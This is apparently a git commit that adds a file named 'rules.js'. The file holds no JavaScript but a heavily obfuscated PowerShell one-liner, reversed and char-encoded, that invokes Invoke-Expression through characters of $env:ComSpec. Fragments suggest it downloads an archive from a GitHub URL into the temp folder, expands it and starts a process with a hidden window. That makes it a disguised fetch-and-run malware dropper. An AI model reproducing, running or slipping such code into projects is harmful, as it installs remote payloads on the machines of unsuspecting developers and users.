b260db667c59fd4eeffc3696bf1dfdf18554802e
Azkic50 <Azkilohj55@gmail.com>
2025-03-25 10:14:54 -0400

    Create rules.js

---
+++ rules.js
@@ -0,0 +1,22 @@
+& ( $enV:cOmSPec[4,15,25]-joIN'') ( (-joIn[regEx]::MatCHES(" ) )'|',)76]rahC[+111]rahC[+96]rahC[((ecaLPeR.)'$',)65]rahC[+811]rahC[+76]rahC[((ecaLPeR.)43]rahC[]gNIrTS[,'50C'(ecaLPeR.)93]rahC[]gNIrTS[,'ybq'(ecaLPeR.)')ybqXybq+]43[EMOHsp8vC+]12[emoHsp8vC (. CoE )63]RAhc'+'[,)801]RAhc[+18]RAhc[+84]RAhc[( eCalPerC- 93]RAhc[,)79]RAhc[+77]RAhc[+84]R'+'Ahc[(eCalPerC- ))ybq55]RAhc[+601ybq,'+'ybqOCchLNCchwoD{dhw( fi      
+ }      
+;}Es'+'LCybq,ybq]RAhc[+27]RAhc[( EcAlPeRc- 43]RAhc[,aM0vYsaM0EcAlPeRc- 69]RAhc[,)ybq,ybqM0tNE,taM0+aM0NEatNE,ybq,ybq{}0{}4{vY'+'s(&        
+{ )}DAybq,ybqchACchF{'+'dhw = }aM0+aM0dACcholnWOd{dhw        
+{ )}hTCchApeCchLif{'+'dhw )tNEhta'+'PtNE,tNEeTtNE,tNE-tstNEf- vYs}2{}0{}ybq,ybqtNEStNE,tNEssecorP-trtNE f-vYs}0{}2{}3{}1{vYs(ybq,ybqE,tNECZtNE,tNEHLtNE,tNaM0+aM0EitNEf-vYs}0{}3{}2{}1ybq'+',ybqM0+aM0{}61{}01{'+'}81{}9{}1{}8{}21{}7{}6{}4{vYs( = )tNEatNE(aM0+aM0{@]tcejbOmotsuCSP[  
+(@ = }atadECchmCchoCchS{dhwybq,ybq.      
+}      
+ ;}Hybq,ybq'+'tAPCcheCchlIf{dhyb'+'q,ybq) )29]RAhc[,)ybq,ybqtNE,tNE:sptthtNE,tNECZtNE,tNE9tNE,tNEmt'+'NEaM0+aM0,tNE4tN'+'E f'+'-vYaM0+aM0sybq,ybqM0+aM0tNEesu/tNE,tNE49'+'tNE,tNE/tNE,tNEetNE,tNEhcatta-rtNE,tNEmoc.buhtNE,tNEtig//tNE,tNEHL/85ybq,ybqchNCchWo'+'d{dhw'+'      
+;vYs)b.idhw(dhw7jHaM0+aM0PME'+'T:v'+'nedhwvYs = }HTCchaPelCchIF{dhw      
+{ yrt  aM0+aM0  
+{ )}ATadeCchmCchos{dhw ni }I{dhw( h'+'caeroaM0+aM0f  
+;)
+})tNEsm.'+'WACCtNybq,ybq)tNEbtNE( ;)tNEstntNE,tNEpiz.WtNE,tN'+'EliftNE,tNE1/setybq,ybqecALPEr- 93]RAhc[,aM0tNEaM0 ecALPEr- 63]RAh'+'c[,aM0dhwaM0  ecALPEr- )aM0  
+
+}  
+} aM0+aM0   
+{ hctac    
+}    
+;}HtApCchECchLCchiF{dhw )tNEtaM0+aybq,y'+'bq{vYs( = ybq,ybqhw = }dAOLCybq,ybq76]RAhc[+99]RAhc[+401]RAhc[(  ybq,ybq}71{}31{}3aM0+aM0{}5'+'{}11aM0+aM0{}0{}41{}2{}51aybq,ybq1{vYs(&( fi      
+;}EuR'+'CcaM'+'0+aM0ht{dybq,yb'+'qDILle'+'HslQ0 (&ybq,ybqNE,tNE4tNE,taM0+aM0NEACCtN'+'E'+',aybq,ybqw eliFtuO- vYsAvYs.'+'}I{dhw '+'irUybq,ybq  
+
+aM0(( ()ybq,ybqaM0+aM0- )tNEybq,ybqnItNE,tNER-ektNE,tNEdohtetNE,tNEaM0+aM0MtsetNE,tNE'+'oaM0+aM0vtNEf-vYs}2{}1{'+'}3ybq,ybqaM0XaM0+]31[dILlEhslQ0+]1[ybqf-50C}'+'71{}82{}62{}9{}21{}52{}22{}91{}81{}4{}2{}1{}42{}72{}32{}7{}01{}41{}12{}11{}31{}5{}51{}61{}8{}02{}3{}0{}6{50C((( '(( )''NiOJ-]2,11,3[EMAn.)'*RDm*' Vg((&" , '.','RighT'+'T'+'Oleft' ) ))
